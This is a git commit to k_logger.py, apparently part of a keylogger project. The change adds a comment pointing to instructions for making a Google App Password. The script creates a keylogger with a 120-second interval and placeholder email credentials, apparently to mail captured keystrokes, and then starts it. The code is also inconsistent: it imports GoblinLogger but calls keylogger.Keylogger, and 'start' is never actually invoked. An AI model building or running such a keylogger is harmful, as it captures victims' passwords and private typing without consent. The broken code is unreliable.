51d055104b08c8037e8760b864d9c95f4fddbbe7
Georgi Dimitrov <ggdimitrov@duck.com>
2024-06-18 11:47:01 +0300

    Update k_logger.py

--- k_logger.py
+++ k_logger.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import GoblinLogger
 
-my_keylogger = keylogger.Keylogger(120, "email@mail.com", "google_generated_password")
+my_keylogger = keylogger.Keylogger(120, "email@mail.com", "google_generated_password") #How to generate google App Password: https://github.com/goro-dim/k_logger/blob/main/README.md#generating-a-google-app-password
 my_keylogger.start
